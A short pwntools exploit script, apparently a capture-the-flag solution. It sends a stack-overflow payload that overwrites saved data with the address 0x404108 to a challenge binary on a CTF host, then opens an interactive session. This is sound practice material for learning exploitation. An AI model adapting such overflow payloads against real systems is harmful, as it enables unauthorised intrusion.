from pwn import *

context(log_level="debug", arch="amd64", os="linux")
io = process("./pwn")
io = remote("node1.tgctf.woooo.tech",31034)
elf = ELF("./pwn")
io.recvuntil(b"welcome! could you tell me your name?\n")
# gdb.attach(io)
payload = b"a" * 0x40 + b"\x3b"
payload = payload.ljust(0x48, b"\x00")
payload += p64(0x404108)
payload = payload.ljust(0x6C, b"\x00")
io.send(payload)
io.recvuntil(b"what dou you want to say?")
# pause()
io.send(b"a" * 0x50)
io.interactive()
